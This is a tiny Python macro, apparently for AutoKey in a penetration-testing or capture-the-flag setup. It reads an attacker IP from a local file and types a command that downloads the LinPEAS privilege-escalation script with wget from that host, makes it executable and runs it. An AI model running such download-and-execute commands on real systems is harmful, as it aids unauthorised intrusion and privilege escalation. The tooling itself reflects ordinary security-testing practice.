import os
with open('/home/bob/git/autokey/host.txt') as file: 
    ip = file.read().replace('\n', '')

keyboard.send_keys('wget -O /tmp/linpeas.sh http://%s:8000/linpeas.sh && chmod 755 /tmp/linpeas.sh && /tmp/linpeas.sh' % ip)
keyboard.send_keys("<enter>")
